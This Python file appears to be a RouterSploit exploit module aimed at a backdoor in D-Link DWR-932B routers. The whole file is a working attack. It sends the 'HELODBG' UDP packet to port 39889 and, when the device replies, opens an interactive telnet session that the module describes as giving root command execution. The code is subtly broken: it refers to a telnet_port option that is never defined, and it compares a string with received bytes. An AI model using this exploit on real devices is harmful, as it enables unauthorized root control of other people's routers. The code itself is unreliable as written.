import socket
import telnetlib
from routersploit.core.exploit import *
from routersploit.core.tcp.tcp_client import TCPClient
from routersploit.core.telnet.telnet_client import TelnetClient


class Exploit(TCPClient, TelnetClient):
    __info__ = {
        "name": "D-Link DWR-932B",
        "description": "Module exploits D-Link DWR-932B backdoor vulnerability which allows "
                       "executing command on operating system level with root privileges.",
        "authors": [
            "Pierre Kim @PierreKimSec",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ],
        "references": [
            "https://pierrekim.github.io/advisories/2016-dlink-0x00.txt",
        ],
        "devices": [
            "D-Link DWR-932B",
        ]
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(23, "Target Telnet port")

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10.0)

        print_status("Sending backdoor packet...")

        response = ""
        try:
            sock.sendto(b"HELODBG", (self.target, 39889))
            response = sock.recv(1024)
        except:
            pass

        sock.close()

        if "Hello" in response:
            print_success("Target seems to vulnerable")
            print_status("Trying to connect to the telnet service {}:{}".format(self.target, self.telnet_port))

            try:
                tn = telnetlib.Telnet(self.target, self.telnet_port)
                tn.interact()
            except:
                print_error("Exploit failed - could not connect to the telnet service")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10.0)

        try:
            sock.sendto(b"HELODBG", (self.target, 39889))
            response = sock.recv(1024)

            if "Hello" in response:
                sock.sendto(b"BYEDBG", (self.target, 39889))
                return True  # target is vulnerable
        except:
            pass

        return False  # target is not vulnerable
